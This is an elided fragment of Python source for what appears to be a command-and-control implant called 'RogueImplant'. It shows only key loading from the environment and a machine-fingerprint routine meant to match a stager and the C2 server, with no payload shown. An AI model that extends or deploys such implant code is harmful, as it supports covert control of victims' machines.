...
def _get_env_key() -> Optional[bytes]:
    ...
    if key_b64:
        try:
            # FIXED: Fernet wants base64 string as bytes, not decoded bytes
...
class RogueImplant:
    ...
    def _generate_machine_id(self) -> str:
        ...
        Priority: 1. ROGUE_FINGERPRINT from stager, 2. System ID, 3. Hostname"""
        # Check if stager passed fingerprint
        fp_from_env = os.environ.get('ROGUE_FINGERPRINT')
        if fp_from_env and len(fp_from_env) == 64:  # SHA256
            # Use the FULL fingerprint, not just first 16 chars
            # This ensures MD5 hash matches what C2 expects
            return fp_from_env
